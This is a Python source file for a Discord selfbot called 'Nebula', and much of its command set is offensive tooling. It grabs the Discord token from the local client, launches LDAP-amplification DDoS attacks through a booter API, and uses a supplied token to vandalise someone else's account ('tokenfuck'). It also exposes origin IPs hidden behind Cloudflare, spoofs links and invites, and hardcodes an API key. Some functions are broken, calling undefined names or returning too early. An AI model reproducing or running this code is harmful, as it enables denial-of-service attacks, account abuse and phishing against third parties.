# -*- coding: utf-8 -*-

version = "1.00"
import asyncio, platform, random, psutil, ctypes, itertools, socket, colorama, getpass, sys, json, subprocess, discord
import os, base64, requests, pytube, hashlib, threading, math, aiohttp, datetime, pythonping, ipapi, time, numpy
from discord.ext import commands
from discord.utils import get
from colorama import Fore, Style
from pytube import YouTube


ctypes.windll.kernel32.SetConsoleTitleW('Nebula')
prefix = "/"
client = discord.Client()
client = commands.Bot(
    command_prefix=prefix,
    self_bot=True
)
client.remove_command('help') 


async def getToken():
	async with aiohttp.ClientSession() as session:
		async with session.ws_connect('ws://127.0.0.1:6463/?v=1&encoding=json', headers={'origin': 'https://discord.com'}, max_msg_size=0) as discordWS:
			await discordWS.send_str(json.dumps({'cmd': 'SUBSCRIBE', 'args': {}, 'evt': 'OVERLAY', 'nonce': 1}))
			await discordWS.send_str(json.dumps({'cmd': 'OVERLAY', 'args': {'type': 'CONNECT', 'pid': 0}, 'nonce': 1}))
			async for message in discordWS:
				try: return message.json()['data']['payloads'][0]['token']
				except: continue
                
username = getpass.getuser()
hostname = socket.gethostname()
OS = platform.platform()
token = asyncio.get_event_loop().run_until_complete(getToken()) 

done = False


def restart_program():
    python = sys.executable
    os.execl(python, python, "\"{}\"".format(sys.argv[0]))


def Clear():
     os.system("cls")

MAGENTA = '\u001b[38;5;196m'
Light_MAGENTA = "\033[0m\033[1;31m"
Green = '\u001b[32m'
Yellow = '\u001b[38;5;226m'
Blue = '\u001b[34m'
Light_Blue = "\033[0m\033[1;34m"
Pink = '\u001b[35m'
White = '\033[97m'
Purple = '\033[38;5;89m'
Light_Grey = '\033[37m'
Dark_Grey = '\033[90m'
 
Clear()

def banner():
    mem = psutil.virtual_memory()
    cpu_per = round(psutil.cpu_percent(),1)
    mem_per = round(psutil.virtual_memory().percent,1)
    Servers = len(client.guilds)    
    ctypes.windll.kernel32.SetConsoleTitleW(f'Nebula - Selfbot | Verison 1.0 | Connected as: {client.user.name}#{client.user.discriminator}')
    os.system('cls')
    Servers = len(client.guilds)
    friends = len(client.user.friends)
    r = f'{Fore.MAGENTA}'
    w = f'{Fore.WHITE}'
    print(f'''
{w}   *  .  . *       *    .        .        .   *    ..  *    *            .      *   *         *   *    .  *      .        .  *   .
{w} .    *        .        .      .        .            *         *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
{w}    *.   *          .     *      *        *    .     *.   *          .     *      *        *    .
{w}         *   *    .  *      .        .  *   .          *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
{w}   .        ..    *    .      *  .  ..  *    .        ..    *    .      *  .  ..  *         *   *    .  *      .        .  *   .

                                    {r}Nebula Loaded{w}!                              {r}charge{w}#{r}1993
                                  {w}═════════════════════════════════════════════════════════════
     
                                       {r}███{w}╗{r}   ██{w}╗{r}███████{w}╗{r}██████{w}╗ {r}██{w}╗   {r}██{w}╗{r}██{w}╗      {r}█████{w}╗ 
                                       {r}████{w}╗  {r}██{w}║{r}██{w}╔════╝{r}██{w}╔══{r}██{w}╗{r}██{w}║   {r}██{w}║{r}██{w}║     {r}██{w}╔══{r}██{w}╗
                                       {r}██{w}╔{r}██{w}╗ {r}██{w}║{r}█████{w}╗  {r}██████{w}╔╝{r}██{w}║   {r}██{w}║{r}██{w}║     {r}███████{w}║
                                       {r}██{w}║╚{r}██{w}╗{r}██{w}║{r}██{w}╔══╝  {r}██{w}╔══{r}██{w}╗{r}██{w}║   {r}██{w}║{r}██{w}║     {r}██{w}╔══{r}██{w}║
                                       {r}██{w}║ ╚{r}████{w}║{r}███████{w}╗{r}██████{w}╔╝╚{r}██████{w}╔╝{r}███████{w}╗{r}██{w}║  {r}██{w}║
                                       {w}╚═╝  ╚═══╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
     
                                                      {r}User:    {w}[{r}{client.user.name}{w}#{r}{client.user.discriminator}{w}] 
                                                      {r}Guilds:  {w}[{r}{Servers}{w}]
                                                      {r}Friends: {w}[{r}{friends}{w}]
                                  {w}═════════════════════════════════════════════════════════════
                                                   
'''+Fore.RESET)
                                                   

@client.event
async def on_connect():
    mem = psutil.virtual_memory()
    cpu_per = round(psutil.cpu_percent(),1)
    mem_per = round(psutil.virtual_memory().percent,1)
    Servers = len(client.guilds)    
    ctypes.windll.kernel32.SetConsoleTitleW(f'Nebula - Selfbot | Verison 1.0 | Connected as: {client.user.name}#{client.user.discriminator}')
    os.system('cls')
    Servers = len(client.guilds)
    friends = len(client.user.friends)
    Clear()
    r = f'{Fore.MAGENTA}'
    w = f'{Fore.WHITE}'
    print(f'''
{w}   *  .  . *       *    .        .        .   *    ..  *    *            .      *   *         *   *    .  *      .        .  *   .
{w} .    *        .        .      .        .            *         *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
{w}    *.   *          .     *      *        *    .     *.   *          .     *      *        *    .
{w}         *   *    .  *      .        .  *   .          *   *    .  *      .        .  *   .         *   *    .  *      .        .  *   .
{w}   .        ..    *    .      *  .  ..  *    .        ..    *    .      *  .  ..  *         *   *    .  *      .        .  *   .

                               {r}Nebula Loaded{w}!                             {r}  charge{w}#{r}1993
                             {w}═════════════════════════════════════════════════════════════
  
                                  {r}███{w}╗{r}   ██{w}╗{r}███████{w}╗{r}██████{w}╗ {r}██{w}╗   {r}██{w}╗{r}██{w}╗      {r}█████{w}╗ 
                                  {r}████{w}╗  {r}██{w}║{r}██{w}╔════╝{r}██{w}╔══{r}██{w}╗{r}██{w}║   {r}██{w}║{r}██{w}║     {r}██{w}╔══{r}██{w}╗
                                  {r}██{w}╔{r}██{w}╗ {r}██{w}║{r}█████{w}╗  {r}██████{w}╔╝{r}██{w}║   {r}██{w}║{r}██{w}║     {r}███████{w}║
                                  {r}██{w}║╚{r}██{w}╗{r}██{w}║{r}██{w}╔══╝  {r}██{w}╔══{r}██{w}╗{r}██{w}║   {r}██{w}║{r}██{w}║     {r}██{w}╔══{r}██{w}║
                                  {r}██{w}║ ╚{r}████{w}║{r}███████{w}╗{r}██████{w}╔╝╚{r}██████{w}╔╝{r}███████{w}╗{r}██{w}║  {r}██{w}║
                                  {w}╚═╝  ╚═══╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
  
                                                 {r}User:    {w}[{r}{client.user.name}{w}#{r}{client.user.discriminator}{w}] 
                                                 {r}Guilds:  {w}[{r}{Servers}{w}]
                                                 {r}Friends: {w}[{r}{friends}{w}]
                             {w}═════════════════════════════════════════════════════════════
                                                   
'''+Fore.RESET)

@client.event
async def on_message_edit(before, after):
    await client.process_commands(after)

@client.command()
async def help(ctx):
    await ctx.message.delete() 
    embed=discord.Embed(title=f"*Nebula Help Commands*", description=f"**General**\nShows General Help Commands\n\n**Tools**\nShows all Tools\n\n**Exploits**\nShows All Discord Exploits\n\n**Status**\n Shows all Status Commands\n",color=0xbf00ff)
    embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def status(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title=f"*Nebula Status Commands*", description=f"**Game**\nShows you're playing a game\n\n**Listen**\nShows you're listening to a song\n\n**Streaming**\nShows you're streaming on twitch\n\n**Watching**\nShows you're watching something\n",color=0xbf00ff)
    embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def exploits(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title=f"*Nebula Exploit Commands*", description=f"**Cloudssp**\nFinds the backend server of a website that is running cpanel\n\n**WebSpoof**\nwebspoof <LINK1> <LINK2>\n\n",color=0xbf00ff)
    embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def general(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title=f"*Nebula General Commands*", description=f"**Purges**\nPurges a certain amount of messages\n\n**D**\nPurges all the messages you sent in server\n\n**chnick**\nChanges given user to given nick (MUST HAVE PERMS)\n\n**MD5**\nEncodes given message in MD5\n\n**SHA256**\nEncodes given message in SHA256\n\n**B64ENCODE**\nEncode given message in Base64\n\n**B64DECODE**\nDecodes given Base64 String\n\n**Covid**\nGets current covid stats in the United States\n\n**Ban**\nBans given user\n\n**Unban**\nUnbans given user\n\n**MR**\nMass Reacts on messages\n\n",color=0xbf00ff)
    embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def tools(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title=f"*Nebula Tools*", description=f"**SubScan**\nScans given website's subdomains\n\n**PhoneLookup**\nLooks up given phone number\n\n**Firewall**\nScans for a firewall on given site\n\n**PortScan**\nPort Scans given site\n\n**Ping**\nPings given site\n\n**Locate**\nFinds Geo-Location of given IP\n\n**Headers**\n Gets given website's headers\n\n**Host2IP**\n Grabs ip from given website\n\n**GetHost**\nTraces given IP to a website\n\n**WebSS**\nScreenShots given website\n\n**Dictionary**\nLooks up given word on Urban Dictionary\n\n**UserInfo**\nGets info from given user\n\n**TokenInfo**\nGrabs info from given token\n\n**Webhook**\nDeletes given webhook\n\n**Spanish**\nTranslates Word/Sentence to spanish\n\n**Russian**\nTranslates Word/Sentence to Russian",color=0xbf00ff)
    embed.set_image(url="https://i.pinimg.com/originals/97/f8/bd/97f8bd5911943c84a08ec0b4d49d2064.gif")
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def webspoof(ctx, link1, link2):
    await ctx.message.delete()
    await ctx.send (f"<https://{link1}>||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||https://{link2}")

@client.command()
async def invitespoof(ctx, link1, link2):
    await ctx.message.delete()
    await ctx.send (f"{link1}||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||{link2}")


@client.command()
async def locate(ctx, ip: str):
    await ctx.message.delete()   
    r = requests.get(url=f"http://ip-api.com/json/{ip}")
    hostname = requests.get(f"https://api.c99.nl/gethostname?key=MZFG2-EOVK4-TCAB0-4UXP9&host={ip}").text.replace("<br>", "\n")
    vpn = requests.get(f"https://api.c99.nl/proxydetector?key=MZFG2-EOVK4-TCAB0-4UXP9&ip={ip}").text.replace("<br>", "\n")
    if r.status_code == 200:
        if(r.json()['status'] == "fail"):
            await ctx.send(f"{ip} is an **invalid** IP Address")
        else:
            flag = f":flag_{r.json()['countryCode'].lower()}:"
            embed = discord.Embed(title=f"**{ip}** lookup!", description=ip,color=0xbf00ff)
            embed.add_field(name="Country", value=f"{flag} {r.json()['country']}", inline=True)
            embed.add_field(name="Region", value=f"{r.json()['region']} / {r.json()['regionName']}", inline=True)
            embed.add_field(name="City", value=f"{r.json()['city']}", inline=True)
            embed.add_field(name="ZIP", value=f"{r.json()['zip']}", inline=True)
            embed.add_field(name="Lat/Long", value=f"{r.json()['lat']}/{r.json()['lon']}", inline=True)
            embed.add_field(name="ISP", value=f"{r.json()['isp']}", inline=True)
            embed.add_field(name="Org", value=f"{r.json()['org']}", inline=True)
            embed.add_field(name="Hostname", value=f"{hostname}", inline=True)
            embed.add_field(name="VPN?", value=f"{vpn}", inline=True)
            await ctx.send(embed=embed,delete_after=10)

@client.command()
async def blockbypass(ctx, message, client_id):
    await ctx.message.delete()
    token = getToken
    client_id = client
    headers = {'Authorization': token}
    res = requests.post('https://discordapp.com/api/v6/users/@me/channels', headers=headers, json={'recipient_id': client_id})
    return res.json().get('id')
    channel_id = _get_channel_id(client_id)
    return requests.post(f'https://discordapp.com/api/v6/channels/{channel_id}/messages', headers=headers, json={'content': message})



@client.command()
async def download(ctx, video):
    await ctx.message.delete()
    yt = YouTube(video)
    ys = yt.streams.get_highest_resolution()
    yt.download()
    embed=discord.Embed(title=f" **Downloaded {yt.title}** ", description=f"", color=0xbf00ff)
 
@client.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == client.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass

@client.command()
async def cloudssp(ctx, site):
    await ctx.message.delete()
    url = sites = site
    x = requests.get(url+'//mailman/listinfo/mailman?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ') 
    if x.status_code == 404:
        embed=discord.Embed(title=f" **Seems like this site is not vulnerable** ", description=f"", color=0xbf00ff)
        await ctx.send(embed=embed,delete_after=10)

    else:
        arg = site
        with requests.get(arg, stream=True) as rsp:
                ip, port = rsp.raw._connection.sock.getpeername()
        output = subprocess.getoutput("curl "+sites+"/mailman/listinfo/mailman -s | findstr POST")
        embed=discord.Embed(title=f" **CloudSSP** ", description=f"URL: {arg}\n Protected IP: **{ip}**\n Protected Port: **{port}**\n **Backend**:\n```{output}\n```", color=0xbf00ff)
        await ctx.send(embed=embed,delete_after=10)

        
@client.command(pass_context=True)
async def chnick(ctx, member: discord.Member, nick):
    await ctx.message.delete()
    await member.edit(nick=nick)
#def cloudssp():
   # @client.command()
    #async def cfbypass(ctx, site):
       # await ctx.message.delete()
        #embed=discord.Embed(title=f" **Check Console!** ", description=f"", color=0xbf00ff)
        #await ctx.send(embed=embed,delete_after=5)

    
   # url = sites = site
   # x = requests.get(url+'/mailman/listinfo/mailman')
    

   # if x.status_code == 404:
    #          print(f'{Fore.MAGENTA}Seems like this site is not vulnerable.')
  #            
   # else:
  #        print(f"{Fore.WHITE}Looks like we found something!")
       #   print("")
  #        print(f"{Fore.YELLOW}IP/Domain links found:{Fore.WHITE}")
   #       print("")

#          os.system("curl "+sites+"/mailman/listinfo/mailman -s | findstr POST")

@client.command()
async def webhook(ctx, webhook):
    await ctx.message.delete()
    try:
        statuscode1 = requests.get(f"{webhook}").status_code
        if statuscode1 ==404:
            embed=discord.Embed(title="**Invalid Webhook!**",color=0xbb2024)
            await ctx.send(embed=embed,delete_after=10)

        elif statuscode1 ==200:
            info = requests.get(f"{webhook}")
            WebName = info.json()['name']
            WebChannelID = info.json()['channel_id']
            WebGuildID = info.json()['guild_id']
            WebID = info.json()['id']
            Avatar = info.json()['avatar']
            requests.delete(f"{webhook}")
            statuscode = requests.get(f"{webhook}").status_code
            if statuscode ==200:
                embed=discord.Embed(title="**Error!**",color=0xbb2024)
                await ctx.send(embed=embed,delete_after=10)

            else:
                embed=discord.Embed(title="__**Deleted!**__",color=0xbf00ff)
                embed.add_field(name="**Name**", value=f"{WebName}", inline=True)
                embed.add_field(name="**Channel ID**", value=f"{WebChannelID}", inline=True)
                embed.add_field(name="**Server ID**", value=f"{WebGuildID}", inline=False)
                embed.set_image(url=f"https://cdn.discordapp.com/avatars/{WebID}/{Avatar}")                          
                await ctx.send(embed=embed,delete_after=10)

    except:
        print(f"{Style.BRIGHT}{Fore.WHITE}[{Style.BRIGHT}{Fore.MAGENTA}!]{Fore.WHITE} Invalid Webhook")     
     
@client.command()
async def reload(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title=f" **Reloading Now!** ", description=f"", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)
    restart_program()

@client.command()
async def md5(ctx, *, message):
    await ctx.message.delete()
    result = hashlib.md5(f"{message}".encode("utf-8")).hexdigest()
    embed=discord.Embed(title=f" MD5 Encode For {message} ", description=f"{result}", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def sha256(ctx, *, message):
    await ctx.message.delete()
    str = f'{message}'
    result = hashlib.sha256(str.encode()).hexdigest()
    embed=discord.Embed(title=f" SHA256 Encode For {message} ", description=f"{result}", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)


def prefixchange(file_name, line_num, text):
  lines = open(file_name, 'r').readlines()
  lines[line_num] = text
  out = open(file_name, 'w')
  out.writelines(lines)
  out.close()

@client.command()
async def cls(ctx):
        await ctx.message.delete()
        Clear()
        banner()

@client.command()
async def prefix(ctx, prefix):
    await ctx.message.delete()
    client.command_prefix = prefix
    embed=discord.Embed(title=f" **Prefix changed to {prefix}** ", description=f"", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def streaming(ctx, url,* ,message):
    await ctx.message.delete()
    stream = discord.Streaming(name=message,url=url)
    await client.change_presence(activity=stream)


@client.command()
async def listen(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=message,)) 


@client.command()
async def game(ctx, *, message):
  await ctx.message.delete()
  game = discord.Game(name=message)
  await client.change_presence(activity=game)

# -- API COMMANDS -- #

@client.command()
async def phonelookup(ctx, phone):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/phonelookup?key=MZFG2-EOVK4-TCAB0-4UXP9&number={phone}").text.replace("<br>", "\n")
    embed=discord.Embed(title=f" **Info On {phone}** ", description=f"{r}", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)


def friendsprint(*objects, sep = ' ', end = '\n ', file = sys.stdout):
    enc = file.encoding
    if enc == 'UTF-8':
        print(*objects, sep = sep, end = end, file = file)
    else:
        f = lambda obj: str(obj).encode(enc, errors = 'backslashreplace').decode(enc)
        print(*map(f, objects), sep = sep, end = end, file = file)

@client.command()
async def backup(ctx):
    await ctx.message.delete()
    for user in client.user.friends:
        friendslist = (user.name)+'#'+(user.discriminator)
        friendsprint(friendslist)

@client.command()
async def ping(ctx, site):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/upordown?key=MZFG2-EOVK4-TCAB0-4UXP9&host={site}").text.replace("<br>", "\n")
    embed=discord.Embed(title=f" **Up or Down?** ", description=f"{r}", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def ldap(ctx, target, port, duration):
    await ctx.message.delete()
    url = "https://api.sleek.to/tests/launch"

    payload = {f"token": "s54624kf7Xuroy", 
           "target": f"{target}", 
           "port": f"{port}",
           "duration": f"{duration}",
           "method": "LDAP",
           "pps": "500000"
           }

    header = {"Content-type": "application/x-www-form-urlencoded",
          "Accept": "text/plain"} 

    response_decoded_json = requests.post(url, data=payload, headers=header)
    response_json = response_decoded_json.json()
    embed=discord.Embed(title=f" **Attack** ", description=f"{response_json}", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)



@client.command()
async def portscan(ctx, ipadd: str):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/portscanner?key=MZFG2-EOVK4-TCAB0-4UXP9&host={ipadd}").text
    embed = discord.Embed(title=f" **Port Scan For {ipadd}** ", color=0xbf00ff)
    embed.add_field(name="Open Ports: ", value=f"{r}", inline=False)
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def spanish(ctx,*, text):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/translate?key=MZFG2-EOVK4-TCAB0-4UXP9&text={text}&tolanguage=ES").text
    embed = discord.Embed(title="**Spanish Text**", description=f"**{r}**", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def russian(ctx,*, text):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/translate?key=MZFG2-EOVK4-TCAB0-4UXP9&text={text}&tolanguage=RU").text
    embed = discord.Embed(title="**Russian Text**", description=f"**{r}**", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def subscan(ctx, text):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/subdomainfinder?key=MZFG2-EOVK4-TCAB0-4UXP9&domain={text}").text.replace("<br>", "\n")
    embed = discord.Embed(title=f"**Subdomain Scan for {text}**", description=f"{r}", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def headers(ctx, text):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/getheaders?key=MZFG2-EOVK4-TCAB0-4UXP9&host={text}").text.replace("<br>", "\n")
    embed = discord.Embed(title=f"**Headers for {text}**", description=f"{r}", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)

# https://api.c99.nl/getheaders?key=<key>&host=example.com
@client.command()
async def torcheck(ctx, text):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/ipvalidator?key=MZFG2-EOVK4-TCAB0-4UXP9&ip={text}").text.replace("<br>", "\n")
    embed = discord.Embed(title=f"**Tor Check for {text}**", description=f"{r}", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def firewall(ctx, text):
    await ctx.message.delete() 
    r = requests.get(f"https://api.c99.nl/firewalldetector?key=MZFG2-EOVK4-TCAB0-4UXP9&url={text}").text.replace("<br>", "\n")
    embed = discord.Embed(title=f"**Firewall Scan for {text}**", description=f"{r}", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def dictionary(ctx, text):
    await ctx.message.delete() 
    r = requests.get(f"https://api.c99.nl/dictionary?key=MZFG2-EOVK4-TCAB0-4UXP9&word={text}").text.replace("<br>", "\n")
    embed = discord.Embed(title=f"**Word lookup for {text}**", description=f"{r}", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def yt2mp3(ctx, text):
    await ctx.message.delete() 
    r = requests.get(f"https://api.c99.nl/youtubemp3?key=MZFG2-EOVK4-TCAB0-4UXP9&videoid={text}").text.replace("<br>", "\n")
    embed = discord.Embed(title=f"**YT 2 MP3**", description=f"{r}", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def passgen(ctx, text):
    await ctx.message.delete() 
    r = requests.get(f"https://api.c99.nl/passwordgenerator?key=MZFG2-EOVK4-TCAB0-4UXP9&length={text}&include=numbers,letters,chars&customlist=abcdefghijklmnopqrstuvwyxyz12345678910!@#$%^&*()").text.replace("<br>", "\n")
    embed = discord.Embed(title=f"**Password Generated!**", description=f"{r}", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def ips(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title="Discord IP Address's",color=0xbf00ff)
    embed.add_field(name="Europe IP's", value=f"188.122.76.15\n5.200.6.155\n188.122.88.143\n5.200.14.187\n5.200.14.248\n", inline=True)
    embed.add_field(name="Russia IP's", value=f"188.122.83.114\n188.122.83.61\n188.122.83.44\n188.122.83.101\n188.122.83.53\n", inline=True)
    embed.add_field(name="Dubai IP'S", value=f"185.179.203.235\n185.179.203.233\n185.179.203.234\n185.179.203.231\n185.179.203.232\n", inline=True)
    embed.add_field(name="US East IP's", value=f"162.244.54.107\n213.179.197.205\n213.179.197.39\n213.179.197.198\n213.179.197.233\n", inline=True)
    embed.add_field(name="US Central IP's", value=f"138.128.142.26\n138.128.141.90\n138.128.142.34\n138.128.141.112\n138.128.142.91\n", inline=True)
    await ctx.send(embed=embed, delete_after=5)

@client.command()
async def webss(ctx, URL):
    await ctx.message.delete()
    r = requests.get(f"https://api.c99.nl/createscreenshot?key=MZFG2-EOVK4-TCAB0-4UXP9&url={URL}").text
    embed=discord.Embed(title=f" **{URL} Screenshot** ", description=f"{r}", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)


# -- API COMMANDS -- #

@client.command()
async def tokeninfo(ctx, _token): 
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }      
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
    except KeyError:
        print(f"{Fore.MAGENTA}[ERROR]: {Fore.MAGENTA}Invalid token"+Fore.RESET)
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})", color=0xbf00ff)
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA?', 'value': res['mfa_enabled']},
        {'name': 'Verified?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)
    
    fields = [
        {'name': 'Number', 'value': res['phone']},
        {'name': 'Auth: ', 'value': res['mfa_enabled']},
        {'name': 'Verified: ', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)

@client.command()
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {'Authorization': token}
    embed=discord.Embed(title="Nuking!", color=0xbf00ff)
    embed.set_thumbnail(url="https://imgur.com/LIyGeCR")
    await ctx.send(embed=embed,delete_after=10)
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "Nebula",
        'region': "europe"
    } 
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.MAGENTA} | {e}"+Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
            except Exception as e:
                print(f"{Fore.MAGENTA}[ERROR]: {Fore.MAGENTA}{e}"+Fore.RESET)
            else:
                break    

@client.command(aliases=["udox"])
async def userinfo(ctx, member: discord.Member = None):
    if not member:  
        member = ctx.message.author  
    roles = [role for role in member.roles]
    embed = discord.Embed(color=0xbf00ff, timestamp=ctx.message.created_at,
                          title=f"User Info - {member}")
    embed.set_thumbnail(url=member.avatar_url)
